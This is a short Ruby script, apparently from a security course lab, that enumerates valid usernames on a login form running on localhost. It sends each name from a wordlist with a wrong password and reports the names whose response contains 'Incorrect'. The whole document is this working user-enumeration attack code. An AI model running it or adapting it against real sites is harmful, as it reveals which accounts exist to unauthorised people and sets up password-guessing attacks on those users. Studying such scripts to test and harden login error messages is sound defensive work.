#!/usr/bin/env ruby

require "net/http"
require "uri"

uri = URI.parse "http://localhost/sessions"
http = Net::HTTP.new uri.host, "3000"

File.open(File.expand_path("../hacktools/usernames-onemonthsimple.txt", File.dirname(__FILE__)), "r").each_line do |username|
  username = username.chomp
  request = Net::HTTP::Post.new uri.request_uri
  request.set_form_data({ email: username, password: "awrongpassword", commit: "Login" })
  response = http.request request

  puts "Found: #{username}" if response.body.include? "Incorrect"
end
